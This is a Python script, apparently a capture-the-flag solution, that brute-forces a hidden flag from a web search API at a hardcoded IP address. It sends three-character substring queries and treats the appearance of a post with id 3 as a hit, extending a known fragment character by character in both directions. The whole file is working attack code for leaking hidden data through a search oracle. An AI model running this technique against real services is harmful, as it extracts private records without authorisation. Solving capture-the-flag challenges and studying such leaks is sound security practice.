import requests # type: ignore
import string
import sys

# Configuration
URL = "http://34.134.162.213:17000/api/search"
# The substring you discovered!
known_part = "l4g"
# Character set to test for the flag. You can add more if needed.   
CHARSET = string.ascii_letters + string.digits + "{}_-!?"

def check_substring(s: str) -> bool:
    """
    Sends a 3-char substring to the server and returns True if it's a match
    and at least one matching post has id == 3.
    """
    if len(s) != 3:
        return False
    try:
        response = requests.post(URL, json={'query': s}, timeout=5)
        if response.status_code == 200:
            data = response.json()
            results = data.get('results', [])
            # Cek apakah ada post dengan id == 3
            for post in results:
                if post.get('id') == 3:
                    return True
    except requests.RequestException:
        return False
    return False

print(f"Starting brute-force with known part: {known_part}")
print("-" * 30)

# --- Part 1: Extend to the right (discovering the end of the flag) ---
# This piece will hold the part of the flag starting from your discovery
# e.g., K{L1nux_w0rld!}
right_side = known_part
while not right_side.endswith('}'):
    found_next_char = False
    # Take the last 2 characters of our known string
    prefix = right_side[-2:]
    for char in CHARSET:
        query = prefix + char
        # Print progress to show it's working
        sys.stdout.write(f"\rTesting (right): {query}")
        sys.stdout.flush()
        if check_substring(query):
            right_side += char
            print(f"\rFound part: {right_side}   ")
            found_next_char = True
            break
    if not found_next_char:
        print("\n[->] Could not find the next character. Stopping right-side search.")
        break

# --- Part 2: Extend to the left (discovering the start of the flag) ---
# This piece will hold the part of the flag before your discovery
# e.g., L3AK{s1de_channe
left_side = known_part
while not left_side.startswith('L3AK{'):
    found_prev_char = False
    # Take the first 2 characters of our known string
    suffix = left_side[:2]
    for char in CHARSET:
        query = char + suffix
        # Print progress to show it's working
        sys.stdout.write(f"\rTesting (left):  {query} ")
        sys.stdout.flush()
        if check_substring(query):
            left_side = char + left_side
            print(f"\rFound part: {left_side}   ")
            found_prev_char = True
            break
    if not found_prev_char:
        print("\n[<-] Could not find the previous character. Stopping left-side search.")
        break
        
# --- Part 3: Combine the results ---
# The left_side search discovers the beginning of the flag up to your known part.
# The right_side search discovers the end of the flag starting from your known part.
# We just need to combine them, removing the duplicated "K{L".
final_flag = left_side + right_side[len(known_part):]

print("\n" + "="*30)
print(f"Brute-force complete.")
print(f"Final Flag: {final_flag}")
print("="*30)